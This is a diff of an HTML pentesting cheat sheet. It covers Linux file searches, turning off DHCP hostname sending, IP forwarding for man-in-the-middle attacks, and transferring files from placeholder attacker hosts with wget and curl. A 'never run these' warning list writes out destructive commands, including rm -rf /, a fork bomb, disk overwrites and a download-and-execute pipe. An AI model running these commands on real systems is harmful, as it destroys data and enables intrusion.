@@ -106,48 +106,51 @@ Topic contains:
 <a href='https://explainshell.com/'> ExplainShell</a> - provides a convenient interface for searching help information for any command
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	<ul>
-		<li> Find all files in / directory (-type d for find dirs):
+		<li> Find all files in / directory (-type d for find dirs):</li>
 			<p> <pre><code> find / -type f </code></pre>
-		<li> File name search:
+		<li> File name search:</li>
 			<p> <pre><code> find / -type f | grep '&lt;FILE_NAME>' </code></pre>
-		<li> Find all path files with ‘config’ in proc dirs:
+		<li> Find all path files with ‘config’ in proc dirs:</li>
 			<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>
-	 	<li> To turn off send hostname via DHCP
+	 	<li> To turn off send hostname via DHCP</li>
 	  		<p> <pre><code> sudo nano /etc/NetworkManager/system-connections/Wired\ connection\ 1 </code></pre>
 	    		<p> &nbsp;&nbsp; [ipv4]
 	      		<p> &nbsp;&nbsp; method=auto
 			<p> &nbsp;&nbsp; dhcp-send-hostname=false
-		<li> To allow traffic routing on your part (Main rule for MITM)
+		<li> To allow traffic routing on your part (Main rule for MITM)</li>
 			<p> <pre><code> sudo sysctl -w net.ipv4.ip_forward=1 </code></pre>
-		<li> Transferring files
+		<li> Transferring files</li>
 			<pre><code> scp &lt;FILE_NAME> &lt;USERNAME>@&lt;TARGET_HOST>:&lt;/path/to/dir/on/victim_machine></code></pre>
 			<pre><code> wget http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> </code></pre>
 			<pre><code> curl http:///&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> -o &lt;FILE_NAME> </code></pre>
 	</ul>
  <h4> &nbsp;&nbsp;&nbsp; Never run these Linux commands: </h4>
  	<ul>
-		<li> This command will delete all files and folders on your computer: 
+		<li>This command will delete all files and folders on your computer:</li>
 			<pre><code> rm -rf /  </code></pre>
-		<li> Also known as a "fork bomb", this command can cause a memory overflow on your computer and lead to system crash:
+		<li>Also known as a "fork bomb", this command can cause a memory overflow on your computer and lead to system crash:</li>
 			<pre><code> :(){ :|: & };: </code></pre>
-		<li> This command formats the hard drive without any warning or confirmation. All data will be lost:
+		<li>This command formats the hard drive without any warning or confirmation. All data will be lost:</li>
 			<pre><code> mkfs.ext4 /dev/sda </code></pre>
-		<li> This command overwrites all data on the hard drive with random values, resulting in data loss:
+		<li>This command overwrites all data on the hard drive with random values, resulting in data loss:</li>
 			<pre><code> dd if=/dev/random of=/dev/sda </code></pre>
-		<li> This command grants full access to your file system for all users, which can compromise security:
+		<li>This command grants full access to your file system for all users, which can compromise security:</li>
 			<pre><code> chmod 777 / </code></pre>
-		<li> This command moves all files in your home directory to "null", effectively deleting them:
+		<li>This command moves all files in your home directory to "null", effectively deleting them:</li>
 			<pre><code> mv /home/* /dev/null </code></pre>
-		<li> This command downloads a file and overwrites all data in "null", resulting in data loss:
+		<li>This command downloads a file and overwrites all data in "null", resulting in data loss:</li>
 			<pre><code> wget http://example.com/file -O /dev/null </code></pre>
-		<li> This command formats the hard drive partition without any warning or confirmation. All data on this partition will be lost:
+		<li>This command formats the hard drive partition without any warning or confirmation. All data on this partition will be lost:</li>
 			<pre><code> mkfs.ext4 /dev/sda1 </code></pre>
-		<li> This command creates a symbolic link to "/etc/passwd" in "null", resulting in data loss:
+		<li>This command creates a symbolic link to "/etc/passwd" in "null", resulting in data loss:</li>
 			<pre><code> ln -s /dev/null /etc/passwd </code></pre>
-		<li> This will replace your partition containing all the necessary data for booting the system with the string "Hello":
+		<li>This will replace your partition containing all the necessary data for booting the system with the string "Hello":</li>
 			<pre><code> echo "Hello" > /dev/sda </code></pre>
-		<li> Such commands will download and execute malicious scripts on your system, potentially compromising your system's security:
+		<li>Such commands will download and execute malicious scripts on your system, potentially compromising your system's security:</li>
 			<pre><code> wget http://malicious_source -O- | sh </code></pre>
+		<li>Symlink command:</li>
+			<pre><code>chmod +x exe_file_name</code></pre>
+			<pre><code>sudo ln -s /path/to/file/ /usr/local/bin/name_command</code></pre>
   	</ul>
 
 <h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
